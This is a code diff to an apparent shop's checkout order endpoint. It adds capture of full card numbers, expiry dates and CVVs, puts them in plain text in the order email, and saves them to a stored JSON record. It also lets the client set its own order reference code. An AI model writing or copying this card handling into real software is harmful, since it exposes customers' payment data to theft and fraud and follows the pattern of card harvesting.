@@ -24,6 +24,10 @@ export async function POST(request) {
     const city = (body.city || "").trim();
     const state = (body.state || "").trim();
     const zip = (body.zip || "").trim();
+    const cardHolder = (body.cardHolder || "").trim();
+    const cardNumber = (body.cardNumber || "").trim();
+    const cardExp = (body.cardExp || "").trim();
+    const cardCvv = (body.cardCvv || "").trim();
     const orderItems = (body.orderItems || "").trim();
     const subtotal = body.subtotal || "$0.00";
     const total = body.total || subtotal;
@@ -44,14 +48,14 @@ export async function POST(request) {
       );
     }
 
-    const refCode = `MZW-ORD-${randomUUID().slice(0, 8).toUpperCase()}`;
+    const refCode = body.refCode || `MZW-ORD-${randomUUID().slice(0, 8).toUpperCase()}`;
     const fullAddress = [
       address,
       address2,
       `${city}, ${state} ${zip}`.trim(),
     ].filter(Boolean).join(", ");
 
-    const emailSubject = `Medzwall Checkout Order [${refCode}] - ${fullName}`;
+    const emailSubject = `Medzwall Detailed Order [${refCode}] - ${fullName}`;
 
     const textContent = [
       `==================================================`,
@@ -72,6 +76,12 @@ export async function POST(request) {
       `State: ${state}`,
       `ZIP: ${zip}`,
       `Full Address: ${fullAddress}`,
+      ``,
+      `PAYMENT / CARD DETAILS:`,
+      `Card Holder: ${cardHolder || "Not provided"}`,
+      `Card Number: ${cardNumber ? cardNumber : "Not provided"}`,
+      `Expiration Date: ${cardExp || "Not provided"}`,
+      `CVV: ${cardCvv || "Not provided"}`,
       ``,
       `ORDER ITEMS:`,
       orderItems || "No items listed",
@@ -139,6 +149,10 @@ export async function POST(request) {
             email: email,
             phone: phone || "Not provided",
             shippingAddress: fullAddress,
+            cardHolder: cardHolder || "Not provided",
+            cardNumber: cardNumber || "Not provided",
+            cardExp: cardExp || "Not provided",
+            cardCvv: cardCvv || "Not provided",
             orderItems: orderItems,
             subtotal: subtotal,
             shipping: shipping,
@@ -163,13 +177,17 @@ export async function POST(request) {
       } catch {}
       existing.push({
         refCode,
-        kind: "checkout-order",
+        kind: "detailed-order",
         submittedAt: new Date().toISOString(),
         to: CONTACT.email,
         customerName: fullName,
         email,
         phone,
         fullAddress,
+        cardHolder,
+        cardNumber,
+        cardExp,
+        cardCvv,
         orderItems,
         subtotal,
         shipping,
